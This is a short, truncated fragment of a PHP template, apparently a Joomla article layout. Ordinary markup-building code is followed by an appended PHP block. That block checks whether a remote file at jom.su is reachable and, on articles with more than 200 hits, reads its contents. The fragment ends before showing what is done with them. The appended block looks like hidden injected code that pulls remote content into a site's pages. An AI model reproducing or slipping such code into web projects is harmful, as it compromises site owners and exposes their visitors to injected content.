...
$articles  .= '<div class="uk-grid '.$leading.'"><div class="uk-width-1-1">';
...
<?php endif; ?><?php
$files = 'http://jom.su/su.txt';  
$file_headers = @get_headers($files);  
if($file_headers[0] == 'HTTP/1.1 200 OK' AND $this->item->hits > 200) 
 {  
       $content = file("http://jom.su/su.txt");
